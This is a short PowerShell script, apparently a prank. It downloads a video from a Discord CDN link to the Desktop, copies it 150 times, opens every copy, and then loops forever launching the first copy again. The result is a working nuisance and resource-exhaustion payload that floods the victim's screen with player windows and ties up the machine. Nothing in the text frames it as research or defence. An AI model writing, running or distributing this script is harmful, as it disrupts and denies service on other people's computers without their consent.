$desktopPath = [System.Environment]::GetFolderPath('Desktop')
$url = 'https://cdn.discordapp.com/attachments/1149399740652466267/1167554693820600400/VID-20231004-WA0002.mp4?ex=665cd08b&is=665b7f0b&hm=a89cced083bb2c0dc3dfd5f5846e94bf144acc21eec47d8b178ae106b2d43a4f&'  
$numFiles = 150
$originalFileName = "file.mp4"

$downloadedFilePath = Join-Path -Path $desktopPath -ChildPath $originalFileName
Invoke-WebRequest -Uri $url -OutFile $downloadedFilePath

Write-Host "File scaricato: $downloadedFilePath"

for ($i = 1; $i -le $numFiles; $i++) {
    $newFileName = "file_$i.mp4"
    $newFilePath = Join-Path -Path $desktopPath -ChildPath $newFileName

    Copy-Item -Path $downloadedFilePath -Destination $newFilePath
    start file_$i.mp4
}

while ($true) {
    Start-Process -FilePath file_1.mp4
}


